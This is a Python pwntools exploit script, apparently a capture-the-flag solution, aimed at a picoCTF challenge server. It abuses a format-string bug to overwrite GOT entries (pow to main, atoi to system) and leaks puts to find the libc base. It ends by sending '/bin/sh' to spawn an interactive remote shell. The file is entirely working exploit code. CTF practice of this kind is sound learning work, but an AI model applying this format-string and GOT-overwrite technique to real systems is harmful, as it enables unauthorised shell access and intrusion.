#!/usr/bin/env python3
from pwn import *

exe = ELF('chall', checksec=False)
p = remote('mars.picoctf.net', 31929)

# libc offsets
sys_offset = 0x055410
puts_offset = 0x0875a0
atoi_offset = 0x047730

# overwrite pow@GOT -> main
payload = b'1111111.' + p64(exe.got['pow'])
p.sendlineafter(b'A: ', payload)
payload = b'1111111.' + f'%{exe.sym.main - 0x2e}c%11$n'.encode()
p.sendlineafter(b'B: ', payload)

# leak puts@GOT
payload = b'1111111.' + p64(exe.got['puts'])
p.sendlineafter(b'A: ', payload)
p.sendlineafter(b'B: ', f'1.%11$s'.encode())
p.sendlineafter(b'B: ', f'1.%11$s'.encode())
p.recvuntil(b'B: 1.')
libc_leak = u64(p.recvline().strip().ljust(8, b'\0'))
libc_base = libc_leak - puts_offset
libc_system = libc_base + sys_offset
libc_atoi = libc_base + atoi_offset

print("libc leak: " + hex(libc_leak))
print("libc base: " + hex(libc_base))
print("system: " + hex(libc_system))
print("atoi: " + hex(libc_atoi))

# overwrite atoi@GOT -> system
part1 = libc_system & 0xffff
part2 = (libc_system >> 16) & 0xffff

payload = b'5'.ljust(8, b'a') + p64(exe.got['atoi']) + p64(exe.got['atoi'] + 2)
p.sendafter(b'A: ', payload)

payload = b'5.'
payload += f'%{(part1 - 0x28) % 0xffff}c%11$hn'.encode()
payload += f'%{(part2 - part1) % 0xffff}c%12$hn'.encode()
p.sendafter(b'B: ', payload)

# trigger system("/bin/sh")
p.sendlineafter(b'A: ', b'/bin/sh')
p.sendlineafter(b'B: ', b'')

p.recvuntil(b'B: ')
p.sendline()

p.interactive()
